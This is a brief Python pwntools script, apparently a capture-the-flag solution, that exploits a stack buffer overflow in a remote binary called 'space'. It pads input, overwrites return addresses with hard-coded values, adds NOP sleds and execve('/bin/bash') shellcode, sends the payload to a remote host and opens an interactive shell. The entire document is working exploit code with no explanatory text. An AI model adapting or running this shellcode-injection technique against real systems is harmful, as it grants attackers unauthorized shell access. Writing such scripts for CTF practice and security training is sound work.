from pwn import *

HOST,PORT = '46.101.23.188',30339
p = remote(HOST, PORT)
#p = process("./space")
#gdb.attach("space")
payload1 = 'A' * 14 + p32(0x0804b827) + p32(0x08049217)+"\x90"*9
payload2 = '\x90' * 18 +p32(0x0804b816)  + asm(shellcraft.execve('/bin/bash'))
payload =payload1+ payload2

p.recvuntil("> ")
p.sendline(payload)
p.interactive()
